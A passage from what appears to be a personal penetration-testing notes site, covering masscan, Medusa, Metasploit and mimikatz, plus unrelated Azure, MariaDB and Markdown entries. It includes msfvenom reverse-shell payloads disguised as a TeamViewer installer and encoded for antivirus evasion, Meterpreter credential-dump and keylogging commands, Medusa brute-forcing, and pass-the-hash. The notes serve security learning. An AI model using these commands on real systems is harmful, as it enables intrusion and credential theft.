(/home/user/Projects/magnolia/applala/my-lalaapp/target/my-lalaapp-1.0-SNAPSHOT.jar)[jar]  ...\n[WARNING] Resource deployed, but the deployment is still in process in Azure\n[INFO] Successfully deployed the artifact to https://my-lalaapp-{id}}.azurewebsites.net\n</code></pre> <p>Installing Visual Studio Code with the following extensions:  - Maven for JAVA from Microsoft - Extension Pack for JAVA from Microsoft - Azure App Service Extension by Microsoft: App Service is Azure's fully-managed Platform as a Service (PaaS) that lets you deploy and scale web, mobile, and API apps. Use the Azure App Service extension for VS Code to quickly create, manage, and deploy your websites. Wiki: https://github.com/Microsoft/vscode-azureappservice/wiki - Azure CLI Tools: Scrapbooks for developing and running commands with the\u00a0Azure CLI.</p> <p>Create a service principal</p> <p>Service principals are dedicated Azure accounts for automated tools providing an account without administrator privileges. Using a service principal is more secure than using a regular user account. To enable Maven to deploy the Magnolia project on Azure, create a service principal with password-based authentication:</p> <pre><code>az ad sp create-for-rbac -n mylalaapp \n</code></pre> <p>https://learn.microsoft.com/en-us/entra/msal/java/build/maven</p>","tags":["magnolia","pentesting","CMS"]},{"location":"magnolia-pentesting/#building-with-maven","title":"Building with Maven","text":"<p>To be able to build with maven, you need a working installation of\u00a0Java\u00a0and\u00a0Maven.</p> <p>Once you have successfully installed Java and Maven, clone the microsoft-authentication-library-for-java repository.</p> <p>From you shell or command line:</p> <ul> <li><code>$ git clone https://github.com/AzureAD/microsoft-authentication-library-for-java.git</code></li> <li><code>$ cd microsoft-authentication-library-for-java</code></li> </ul> <p>Then run:</p> <ul> <li><code>mvn clean</code></li> <li><code>mvn package</code></li> </ul> <p>You should now have a \"target\" directory with\u00a0<code>msal4j-x.x.x.jar</code>.</p> <p>To install, run:</p> <ul> <li><code>mvn install -DskipITs</code></li> </ul>","tags":["magnolia","pentesting","CMS"]},{"location":"mailsniper/","title":"MailSniper","text":"<p>MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email or by an Exchange administrator to search the mailboxes of every user in a domain.</p>","tags":["pentesting","enumeration","tools","msoffice","SMTP"]},{"location":"mailsniper/#installation","title":"Installation","text":"<p>Repo: https://github.com/dafthack/MailSniper</p>","tags":["pentesting","enumeration","tools","msoffice","SMTP"]},{"location":"mariadb/","title":"MariaDB","text":"<p>MariaDB is an open source relational database management system (RDBMS) that is a compatible drop-in replacement for the widely used MySQL database technology. It is developed by MariaDB Foundation and initially released on 29 October 2009. MariaDB has a significantly high number of new features, which makes it better in terms of performance and user-orientation than MySQL.</p>","tags":["database","relational database","SQL"]},{"location":"mariadb/#basic-commands","title":"Basic commands","text":"<pre><code># Get all databases\nshow databases;\n\n# Select a database\nuse &lt;databaseName&gt;;\n\n# Get all tables from the previously selected database\nshow tables; \n\n# Dump columns from a table\ndescribe &lt;table_name&gt;;\n\n# Dump columns from a table\nshow columns from &lt;table&gt;;\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"mariadb/#connect-to-database-mariadb","title":"Connect to database: mariadb","text":"<pre><code># -h host/ip   \n# -u user As default mariadb has a root user with no authentication\nmariadb -h &lt;host/IP&gt; -u root\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"markdown/","title":"Markdown","text":"","tags":["tool","language"]},{"location":"markdown/#titles-code","title":"Titles: code","text":"<pre><code># H1\n</code></pre> <pre><code>## H2\n</code></pre> <pre><code>### H3\n</code></pre>","tags":["tool","language"]},{"location":"markdown/#formating-the-text","title":"Formating the text","text":"<pre><code>*italic*   \n</code></pre> <pre><code>**bold**\n</code></pre> <pre><code>==highlight==\n</code></pre>","tags":["tool","language"]},{"location":"markdown/#blockquote-code","title":"Blockquote code","text":"<pre><code>&gt; blockquote\n</code></pre>","tags":["tool","language"]},{"location":"markdown/#lists","title":"Lists","text":"<p>Bullets</p> <pre><code>+ One bullet\n+ Second Bullet\n+ Third bullet\n</code></pre> <p>Ordered lists</p> <pre><code>1. First item in list\n2. Second item in list\n</code></pre> <p>Item list</p> <pre><code>- First item\n- Second item\n- Third item\n</code></pre>","tags":["tool","language"]},{"location":"markdown/#horizontal-rule","title":"Horizontal rule","text":"<pre><code>--- \n</code></pre>","tags":["tool","language"]},{"location":"markdown/#links","title":"Links","text":"<pre><code>[link](https://www.example.com)\n</code></pre>","tags":["tool","language"]},{"location":"markdown/#image-code","title":"Image: code","text":"<pre><code>![alt text](image.jpg)\n</code></pre>","tags":["tool","language"]},{"location":"markdown/#tables","title":"Tables","text":"<pre><code>| ColumnName | ColumnName |\n| ---------- | ---------- |\n| Content | Content that you want |\n</code></pre>","tags":["tool","language"]},{"location":"markdown/#footnote-code","title":"Footnote: code","text":"<pre><code>Here's a sentence with a footnote. [^1]\n\n[^1]: This is the footnote. \n</code></pre>","tags":["tool","language"]},{"location":"markdown/#task-list","title":"Task list","text":"<pre><code>- [x] Write the press release\n- [ ] Update the website\n- [ ] Contact the media \n</code></pre>","tags":["tool","language"]},{"location":"markdown/#fenced-coded-block-code","title":"Fenced coded block: code","text":"<pre><code>\\```\ncode inside\n\\```\n</code></pre>","tags":["tool","language"]},{"location":"markdown/#strikethrough","title":"Strikethrough","text":"<pre><code>~~Love is flat.~~ \n</code></pre>","tags":["tool","language"]},{"location":"markdown/#emojis","title":"Emojis","text":"<pre><code>:emoji-code: \n</code></pre>","tags":["tool","language"]},{"location":"masscan/","title":"masscan - An IP scanner","text":"<p>Masscan was designed to deal with large networks and to scan thousands of Ip addresses at once. It\u2019s faster than nmap but probably less accurate.</p>","tags":["reconnaissance","scanning"]},{"location":"masscan/#installation","title":"Installation","text":"<pre><code>sudo apt-get install git gcc make libpcap-dev\ngit clone https://github.com/robertdavidgraham/masscan\ncd masscan/\nmake\n</code></pre> <p>\"make\" puts the program in the <code>masscan/bin</code> subdirectory. To install it (on Linux) run:</p> <pre><code>make install\n</code></pre> <p>The source consists of a lot of small files, so building goes a lot faster by using the multi-threaded build. This requires more than 2gigs on a  Raspberry Pi (and breaks), so you might use a smaller number, like <code>-j4</code> rather than all possible threads.</p> <pre><code>make -j\n</code></pre> <p>Make sure that is running properly:</p> <pre><code>cd bin\n./masscan --regress\n</code></pre>","tags":["reconnaissance","scanning"]},{"location":"masscan/#usage","title":"Usage","text":"<p>Usage is similar to <code>nmap</code>. To scan a network segment for some ports:</p> <pre><code>./masscan -p22,80,443,53,3389,8080,445 -Pn --rate=800 --banners 10.0.2.1/24 -e tcp0 --router-ip 10.0.2.456  --echo &gt;  masscan.conf\n# To see the complete list of options, use the `--echo` feature. This dumps the current configuration and exits. This output can be used as input back into the program:\n</code></pre> <p>Another example:</p> <pre><code>masscan -p80,8000-8100 10.0.0.0/8 2603:3001:2d00:da00::/112\n# This will scan the `10.x.x.x` subnet, and `2603:3001:2d00:da00::x` subnets\n# Scan port 80 and the range 8000 to 8100, or 102 ports total, on both subnets\n# Print output to `&lt;stdout&gt;` that can be redirected to a file\n</code></pre>","tags":["reconnaissance","scanning"]},{"location":"masscan/#editing-config-file","title":"Editing config file","text":"<pre><code>nano masscan.conf\n# here, you add:  output-filename = scan.list //also json, xml\n</code></pre> <p>Now to tun it again using the configuration file: </p> <pre><code>masscan -c masscan.conf\n</code></pre>","tags":["reconnaissance","scanning"]},{"location":"medusa/","title":"Medusa","text":"<p>Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application:</p>","tags":["pentesting","brute forcing","windows","passwords"]},{"location":"medusa/#installation","title":"Installation","text":"<p>Pre-installed in Kali.</p> <pre><code>wget http://www.foofus.net/jmk/tools/medusa-2.2.tar.gz\n./configure\nmake\nmake install\n</code></pre>","tags":["pentesting","brute forcing","windows","passwords"]},{"location":"medusa/#basic-usage","title":"Basic usage","text":"<pre><code># Brute force FTP logging\nmedusa -u fiona -P /usr/share/wordlists/rockyou.txt -h $IP -M ftp -n 2121\n# -u: username\n# -U: list of Usernames\n# -p: password\n# -P: list of passwords\n# -h: host /IP\n# -M: protocol to bruteforce\n# -n: for a different non-default port. For instance, port 2121 for ftp \n</code></pre>","tags":["pentesting","brute forcing","windows","passwords"]},{"location":"metasploit/","title":"metasploit","text":"<p>Developed in ruby by rapid7. \"Free\" edition preinstalled in Kali at /usr/share/metasploit-framework</p> <p>Existent modules: </p> <pre><code>ls /usr/share/metasploit-framework/modules\n\nauxiliary  encoders  evasion  exploits  nops  payloads  post\n\n# Syntax: &lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;\n# Example\n794   exploit/windows/ftp/scriptftp_list\n</code></pre> <p>Existent plugins:</p> <pre><code>ls /usr/share/metasploit-framework/plugins/\n\naggregator.rb      ips_filter.rb  openvas.rb           sounds.rb\nalias.rb           komand.rb      pcap_log.rb          sqlmap.rb\nauto_add_route.rb  lab.rb         request.rb           thread.rb\nbeholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb\ndb_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb\ndb_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb\nevent_tester.rb    nessus.rb      session_tagger.rb    wmap.rb\nffautoregen.rb     nexpose.rb     socket_logger.rb\n</code></pre> <p>Existent scripts (meterpreter among them):</p> <pre><code>ls /usr/share/metasploit-framework/scripts/\n\nmeterpreter  ps  resource  shell\n</code></pre> <p>Command line utilities: </p> <pre><code>ls /usr/share/metasploit-framework/tools/\n\ncontext  docs     hardware  modules   payloads\ndev      exploit  memdump   password  recon\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#run-metasploit","title":"Run metasploit","text":"<pre><code># start the postgresql service\nservice postgresql start \n\n# Initiate database\nsudo msfdb init\u00a0\n\n# Launch metasploit from terminal. -q means without banner\nmsfconsole -q\u00a0 \n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#update-metasploit","title":"Update metasploit","text":"<p>How to update metasploit database, since msfupdate is deprecated.</p> <pre><code># Update the whole system\napt update &amp;&amp; apt-upgrade -y \u00a0 \n\n# Update libraries and dependencies\napt dist-upgrade\n\n# Reinstall the app\napt install metasploit-framework \n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#basic-commands","title":"Basic commands","text":"<pre><code># Help information\nshow -h\u00a0 \n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#databases","title":"Databases","text":"<pre><code># Start PostgreSQL\nsudo systemctl start postgresql\n\n# Initiate a Database\nsudo msfdb init\n\n# Check status\nsudo msfdb status\n\n# Connect to the Initiated Database\nsudo msfdb run\n\n# Reinitiate the Database\nmsfdb reinit\ncp /usr/share/metasploit-framework/config/database.yml ~/.msf4/\nsudo service postgresql restart\nmsfconsole -q\n\ndb_status\n\n# Connect to an existing data service\ndb_connect\u00a0 \u00a0 \u00a0 \u00a0 \n\n# Disconnect from the current data service\ndb_disconnect \u00a0 \u00a0 \n\n# Export a file containing the contents of the database\ndb_export \u00a0 \u00a0 \u00a0 \u00a0 \n\n# Before closing the session, save a backup:\ndb_export -f xml backup.xml\n\n# Import a scan result file (filetype will be auto-detected)\ndb_import \u00a0 \u00a0 \u00a0 \u00a0 \n# For instance: \ndb_import Target.xml \n# Or:\ndb_import Target.nmap\n\n\n# After finishing the session, make sure to back up our data if anything happens with the PostgreSQL service. \ndb_export -f xml backup.xml\n\n\n# Rebuilds the database-stored module cache (deprecated)\ndb_rebuild_cache\u00a0 \n\n# Remove the saved data service entry\ndb_remove \u00a0 \u00a0 \u00a0 \u00a0 \n\n#  Save the current data service connection as the default to reconnect on startup\ndb_save \u00a0 \u00a0 \u00a0 \u00a0 \u00a0\n\n#  Show the current data service status\ndb_status \u00a0 \u00a0 \u00a0 \u00a0\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#workspaces","title":"Workspaces","text":"<pre><code>#####\n# workspaces \n#####\n#  Switch between database\nworkspace \u00a0 \u00a0 \u00a0 \u00a0\n\n# List workspaces\nworkspace         \n\n# List workspaces verbosely\nworkspace -v      \n\n# Switch workspace\nworkspace [name]  \n\n# Add workspace(s)\nworkspace -a [name] ...    \n\n# Delete workspace(s)\nworkspace -d [name] ...    \n\n# Delete all workspaces\nworkspace -D\n\n# Rename workspace\nworkspace -r\n\n# Show this help information\nworkspace -h     \n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#nmap","title":"Nmap","text":"<pre><code>#####\n# ## Using Nmap Inside MSFconsole \n#####\n# Executes nmap and records the output automatically\ndb_nmap \u00a0 \u00a0\n\n# List all hosts in the database\nhosts \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \n\n# List stored Credentials. The\u00a0`creds`\u00a0command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.\ncreds\n\n# List all loot in the database. The\u00a0`loot`\u00a0command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more: \nloot\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \n\n# List all notes in the database\nnotes \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \n\n#  List all services in the database.The\u00a0`services`\u00a0command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable. \nservices\u00a0 \u00a0 \u00a0 \u00a0 \u00a0\n\n# List all vulnerabilities in the database\nvulns \u00a0 \u00a0 \u00a0\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#cheat-sheet-basic-commands","title":"Cheat sheet: basic commands","text":"<pre><code># Search modules and filter with grep\nsearch &lt;mysearchitem&gt; \ngrep meterpreter show payloads\ngrep -c meterpreter grep reverse_tcp show payloads\n#-c is for counting the results\n\n# Search for exploit of service hfs 2.3 serve in ExploitDB's entries\nsearchsploit hfs 2.3\n\n#  launch msfconsole and run the reload_all command for the newly installed module to appear in the list\nreload_all\n\n\n# Use a module\u00a0\nuse &lt;name of module (like exploit/cmd/linux/tcp_reverse) or number&gt; \n\n# Show options of current module (Watch out, prompt is included)\nmsf exploit/cmd/linux/tcp_reverse&gt; show options\u00a0\n\n# Configure an option (Watch out, prompt is included)\nmsf\u00a0exploit/cmd/linux/tcp_reverse&gt;set &lt;option&gt; &lt;value&gt; \n\n# Configure an option as a constant during the msf session (Watch out, prompt is included)\nmsf exploit/cmd/linux/tcp_reverse&gt; setg &lt;option&gt; &lt;value&gt; \n\n# Go back to the main msf prompt (Watch out, prompt is included)\nmsf\u00a0exploit/cmd/linux/tcp_reverse&gt; back \n\n# View related information of the exploit (Watch out, prompt is included)\nmsf\u00a0 exploit/cmd/linux/tcp_reverse&gt; info \n\n# View related payloads of the exploit (Watch out, prompt is included)\nmsf\u00a0 exploit/cmd/linux/tcp_reverse&gt; show payloads \n\n# Set a payload for the exploit (Watch out, prompt is included)\nmsf\u00a0 exploit/cmd/linux/tcp_reverse&gt; set payload &lt;value&gt; \n\n# Before we run an exploit-script, we can run a check to ensure the server is vulnerable (Note that no\nt every exploit in the Metasploit Framework supports the `check` function)\nmsf6 exploit(windows/smb/ms17_010_psexec) &gt; check\n\n# Run the exploit (Watch out, prompt is included)\nmsf\u00a0 exploit/cmd/linux/tcp_reverse&gt; run\u00a0 \n\n# Run the exploit (Watch out, prompt is included)\nmsf\u00a0exploit/cmd/linux/tcp_reverse&gt; exploit \n\n# Run an exploit as a job by typing exploit -j\nexploit -j\n\n# See all sessions (Watch out, prompt is included)\nmsf&gt; sessions\n\n# Switch to session number n (Watch out, prompt is included)\nmsf&gt; sessions -i &lt;n&gt;\u00a0 \n\n# Kill all sessions (Watch out, prompt is included)\nmsf&gt; sessions -K\u00a0 \n</code></pre> <p>To kill a session we don't use CTRL-C, because the port would be still in use. For that we have jobs</p> <pre><code>+++++++++\njobs\n++++++++++\n    -K        Terminate all running jobs.\n    -P        Persist all running jobs on restart.\n    -S &lt;opt&gt;  Row search filter.\n    -h        Help banner.\n    -i &lt;opt&gt;  Lists detailed information about a running job.\n    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.\n    -l        List all running jobs.\n    -p &lt;opt&gt;  Add persistence to job by job ID\n    -v        Print more detailed info.  Use with -i and -l\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#plugins","title":"Plugins","text":"<p>To start using a plugin, we will need to ensure it is installed in the correct directory on our machine. </p> <pre><code>ls /usr/share/metasploit-framework/plugins\n</code></pre> <p>If the plugin is found here, we can fire it up inside msfconsole. Example:</p> <pre><code>load nessus\n</code></pre> <p>To install new custom plugins not included in new updates of the distro, we can take the .rb file provided on the maker's page and place it in the folder at <code>/usr/share/metasploit-framework/plugins</code> with the proper permissions. Many people write many different plugins for the Metasploit framework:</p> <p>nMap (pre-installed) NexPose (pre-installed) Nessus (pre-installed) Mimikatz (pre-installed V.1) Stdapi (pre-installed) Railgun Priv Incognito (pre-installed) Darkoperator's</p> <p>Afterward, launch\u00a0<code>msfconsole</code>\u00a0and check the plugin's installation by running the\u00a0<code>load</code>\u00a0command. After the plugin has been loaded, the\u00a0<code>help menu</code>\u00a0at the\u00a0<code>msfconsole</code>\u00a0is automatically extended by additional functions.</p> <pre><code># MSF - Loading Additional Modules at Runtime\ncp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb\nmsfconsole -m /usr/share/metasploit-framework/modules/\n\n\n# #### MSF - Loading Additional Modules\nloadpath /usr/share/metasploit-framework/modules/\n\nreload_all\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#meterpreter","title":"Meterpreter","text":"<p>The Meterpreter payload is a specific type of multi-faceted payload that uses <code>DLL injection</code> to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques.</p> <p>When having an active session on the victim machine, the best module to run a Meterpreter is s4u_persistence:</p> <pre><code>use exploit/windows/local/s4u_persistence\n\nshow options\n\nsessions\u00a0\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#meterpreter-commands","title":"Meterpreter commands","text":"<pre><code># view all available commands\nhelp \n\n# Obtain a shell. Exit to exit the shell\nshell\u00a0 \n\n# View information about the system\nsysinfo\n\n# View the id that meterpreter assigns to the machine\nmachine_id\n\n# Print the network configuration\nifconfig \n\n# check routing information\nroute \u00a0 \n\n# Download a file\ndownload /path/to/fileofinterest.txt /path/to/ourmachine/destinationfile.txt\n\n# Upload a file\nupload /path/from/source.txt /path/to//destinationfile.txt\n\n# Bypass the authentification. It takes you from normal user to admin\ngetsystem\n# If the operation fails because of priv_elevated_getsystem error message, then use the\u00a0 bypassuac module: use exploit/windows/local/bypassuac\n\n# View who you are\ngetuid  \n\n# View all running processes\nps\n\n# Migrate to a different process with more privileges\nsteal_token &lt;PID&gt;\n\n# View the process that we are\ngetpid\n\n# Dumps the contents of the SAM database\nhashdump      \n\n# Dumps ...\nlsa_dump_sam\n\n# Meterpreter LSA Secrets Dump\nlsa_dump_secrets\n\n# Enumerate the modules available at this meterpreter session\nuse -l \u00a0 \n\n# load a specific module\nuse &lt;name of module&gt;\u00a0 \n\n# View all processes run by the system. This allows us to choose one in order to migrate the process of our persistent connection in order to have one less suspicious.\u00a0\nps -U SYSTEM\u00a0 \n\n# Change to a process\nmigrate\u00a0 &lt;pid&gt;\u00a0 \u00a0 \u00a0 \u00a0 \nmigrate -N lsass.exe\n# -N \u00a0 Look for the lsass.exe process and migrate the process into that. We can do this to run the command: hashdump (we\u2019ll get hashes to use them with john the ripper or ophcrack). Also, we can choose a less suspicious process such as svhost.exe and migrate there.\n\n# Get a windows shell\nexecute -f cmd.exe -i -H\n\n# Display the host ARP cache\narp           \n\n# Display the current proxy configuration\nget proxy\n\n# Display interfaces\nifconfig       \n\n# Display the network connections\nnetstat       \n\n# Forward a local port to a remote service\nportfwd       \n\n# Resolve a set of hostnames on the target\nresolve     \n\n# Send Session to backgroud\nbg\n</code></pre> <p>More commands</p> <pre><code>msf6&gt; help\n    Command        Description\n    -------        -----------\n    enumdesktops   List all accessible desktops and window stations\n    getdesktop     Get the current meterpreter desktop\n    idle time       Returns the number of seconds the remote user has been idle\n    keyboard_send  Send keystrokes\n    keyevent       Send key events\n    keyscan_dump   Dump the keystroke buffer\n    keyscan_start  Start capturing keystrokes\n    keyscan_stop   Stop capturing keystrokes\n    mouse          Send mouse events\n    screenshare    Watch the remote user's desktop in real-time\n    screenshot     Grab a screenshot of the interactive desktop\n    setdesktop     Change the meterpreters current desktop\n    uictl          Control some of the user interface components\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#encoders","title":"Encoders","text":"<p><code>Encoders</code>\u00a0come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include: <code>x64</code>, <code>x86</code>, <code>sparc</code>, <code>ppc</code>, <code>mips</code>.</p> <p>Shikata Ga Nai (<code>SGN</code>) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore.</p> <p>Generating Payload - Without Encoding</p> <pre><code># #### Generating Payload - Without Encoding\n# For instance, crafting a DLL file with a webshell\n#########\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port$ -a x86 -f dll &gt; SECUR32.dll\n# -p: for the chosen payload\n# -a: architecture in the victim machine/application\n# -f: format for the output file\n\n# List enconders\nshow encoders\n</code></pre> <p>Generating Payload - With Encoding</p> <pre><code># #### Generating Payload - With Encoding\n# crafting a .exe file with Shikata Ga Nai encoder\n#########\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe\n# -e: chosen encoder \n</code></pre> <p>We can run multiple iterations of the same encoding scheme to escape EDS/IDR </p> <pre><code># #### Generating Payload - With Encoding - \n# Running multiple iterations\n#########\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe -k\n\n# -a: The architecture to use for --payload and --encoders (use --list archs to list)\n# -x, --template &lt;path&gt;: Specify a custom executable file to use as a template\n# -k, --keep: Preserve the --template behaviour and inject the payload as a new thread\n</code></pre> <p></p> <p>As we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload. Alternatively, Metasploit offers a tool called\u00a0<code>msf-virustotal</code>\u00a0that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.</p>","tags":["pentesting"]},{"location":"metasploit/#msf-virustotal","title":"MSF - VirusTotal","text":"<p>If we check against VirusTotal to get a detection baseline from the payload we generated:</p> <pre><code>msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#packers","title":"Packers","text":"<p>Packers allow the <code>executable compression</code>\u00a0of payload along with the executable program, leading to the decompression code in one single file. Packing Services for Optimal Antivirus Evasion (list of popular packer software):</p> <p>UPX packer The Enigma Protector MPRESS Alternate EXE Packer ExeStealth Morphine MEW Themida</p>","tags":["pentesting"]},{"location":"metasploit/#modules","title":"Modules","text":"","tags":["pentesting"]},{"location":"metasploit/#multihandler","title":"multi/handler","text":"<p>Setting Up Multi/Handler</p> <pre><code>use multi/handler\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#search-local_exploit_suggester","title":"search local_exploit_suggester","text":"<p>Once you've gained foothold in a system, this module helps you find ways to exploit the target further (provileges escalation).</p>","tags":["pentesting"]},{"location":"metasploit/#auxiliaryscannersmbsmb_login","title":"auxiliary/scanner/smb/smb_login","text":"<p>Use this to enumerate users and brute force passwords in a smb service.</p>","tags":["pentesting"]},{"location":"metasploit/#auxiliaryhttp_javascript_keylogger","title":"auxiliary/http_javascript_keylogger","text":"<p>It creates the Javascript payload with a keylogger, which could be injected within the XSS vulnerable web page and automatically starts the listening server. To see how it works, set the DEMO option to true.</p>","tags":["pentesting"]},{"location":"metasploit/#postwindowsgatherhasdump","title":"post/windows/gather/hasdump","text":"<p>Once you have a meterpreter session as system user, this module dumps all passwords.</p>","tags":["pentesting"]},{"location":"metasploit/#windowsgatherarp-scanner","title":"windows/gather/arp-scanner","text":"<p>To enumerate IPs in a network interface</p>","tags":["pentesting"]},{"location":"metasploit/#windowsgathercredentialswindows_autologin","title":"windows/gather/credentials/windows_autologin","text":"<p>This module extracts the plain-text Windows user login password in\u00a0 Registry. It exploits a Windows feature that Windows (2000 to 2008 R2) allows a user or third-party Windows Utility tools to configure User AutoLogin via plain-text password insertion in (Alt)DefaultPassword field in the registry location -\u00a0 HKLM\\Software\\Microsoft\\Windows NT\\WinLogon. This is readable by all\u00a0 users.</p>","tags":["pentesting"]},{"location":"metasploit/#postwindowsgatherwin_privs","title":"post/windows/gather/win_privs","text":"<p>This module tells you the privileges you have on the exploited machine.\u00a0</p>","tags":["pentesting"]},{"location":"metasploit/#exploitwindowslocalbypassuac","title":"exploit/windows/local/bypassuac","text":"<p>If getsystem command fails (in the meterpreter) because of a priv_elevated_getsystem error message, then use this module to bypass that restriction. You will get a new meterpreter session with the UAC policy disabled. Now you can run getsystem.use</p>","tags":["pentesting"]},{"location":"metasploit/#postmultimanageshell_to_meterpretersessions","title":"post/multi/manage/shell_to_meterpretersessions","text":"<p>It upgrades your shell to a meterpreter</p>","tags":["pentesting"]},{"location":"metasploit/#postmultireconlocal_exploit_suggester","title":"post/multi/recon/local_exploit_suggester","text":"<p>local exploit suggester module:</p> <pre><code>post/multi/recon/local_exploit_suggester\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#auxiliaryserversocks_proxy","title":"auxiliary/server/socks_proxy","text":"<p>This module provides a SOCKS proxy server that uses the builtin Metasploit routing to relay connections.</p>","tags":["pentesting"]},{"location":"metasploit/#exploitwindowsfileformatadobe_pdf_embedded_exe","title":"exploit/windows/fileformat/adobe_pdf_embedded_exe","text":"<p>And also exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs To include malware into an adobe pdf</p>","tags":["pentesting"]},{"location":"metasploit/#integration-of-metasploit-with-veil","title":"Integration of metasploit with veil","text":"<p>One nice thing about veil is that it provides a metasploit RC file, meaning that in order to launch the multihandler you just need to run:</p> <pre><code>msfconsole -r path/to/metasploitRCfile\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#ipmi-information-discovery","title":"IPMI Information discovery","text":"<p>See ipmi service on UDP/623. This module discovers host information through IPMI Channel Auth probes:</p> <pre><code>use auxiliary/scanner/ipmi/ipmi_version\n\nshow actions ...actions... msf \nset ACTION &lt; action-name &gt; msf \nshow options \n# and set needed options\nrun\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#pmi-20-rakp-remote-sha1-password-hash-retrieval","title":"PMI 2.0 RAKP Remote SHA1 Password Hash Retrieval","text":"<p>This module identifies IPMI 2.0-compatible systems and attempts to retrieve the HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300. </p> <pre><code>use auxiliary/scanner/ipmi/ipmi_dumphashes\n\nshow actions\n\nset ACTION &lt; action-name &gt;\n\nshow options\n# set &lt;options&gt;\n\nrun\n</code></pre>","tags":["pentesting"]},{"location":"metasploit/#the-http_javascript_keylogger","title":"The http_javascript_keylogger","text":"<p>This modules runs a web server that demonstrates keystroke logging through JavaScript. The DEMO option can be set to enable a page that demonstrates this technique. To use this module with an existing web page, simply add a script source tag pointing to the URL of this service ending in the .js extension. For example, if URIPATH is set to \"test\", the following URL will load this script into the calling site: http://server:port/test/anything.js</p> <pre><code>use auxiliary/server/capture/http_javascript_keylogger\n</code></pre>","tags":["pentesting"]},{"location":"mimikatz/","title":"mimikatz","text":"<p><code>mimikatz</code> is a tool made in <code>C</code> .</p> <p>It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. <code>mimikatz</code> can also perform pass-the-hash, pass-the-ticket or build Golden tickets.</p> <p>Kiwi module in a meterpreter in metasploit is an adaptation of mimikatz.</p>","tags":["windows","dump hashes","passwords","pass the hash attack"]},{"location":"mimikatz/#no-installation-portable","title":"No installation, portable","text":"<p>Download from: https://github.com/ParrotSec/mimikatz.git</p>","tags":["windows","dump hashes","passwords","pass the hash attack"]},{"location":"mimikatz/#basic-usage","title":"Basic usage","text":"<pre><code># Impersonate as NT Authority/SYSTEM (having permissions for it).\ntoken::elevate\n\n# List users and hashes of the machine\nlsadump::sam\n\n# Enable debug mode for our user\nprivilege::debug\n\n# List users logged in the machine and still in memory\nsekurlsa::logonPasswords full\n\n# Pass The Hash attack in windows:\n# 1. Run mimikatz\nmimikatz.exe privilege::debug \"sekurlsa::pth /user:&lt;username&gt; /rc4:&lt;NTLM hash&gt; /domain:&lt;DOMAIN&gt; /run:&lt;Command&gt;\" exit\n# sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password\n# /run:&lt;Command&gt;: For example /run:cmd.exe\n# 2. After that, we canuse cmd.exe to execute commands in the user's context. \n</code></pre>","tags":["windows","dump hashes","passwords","pass the hash attack"]},{"location":"mimikatz/#an-example","title":"An Example","text":"<p>1. Enumerating SPNs with setspn.exe</p> <pre><code>setspn.exe -Q */*\n</code></pre> <p>We will focus on\u00a0<code>user accounts</code>\u00a0and ignore the computer accounts returned by the tool.</p> <p>2. Using PowerShell, we can request TGS tickets for the interested account and load them into memory.</p> <pre><code>Add-Type -AssemblyName System.IdentityModel\n# Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object.\n# -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using\n# System.IdentityModel is a namespace that contains different classes for building security token 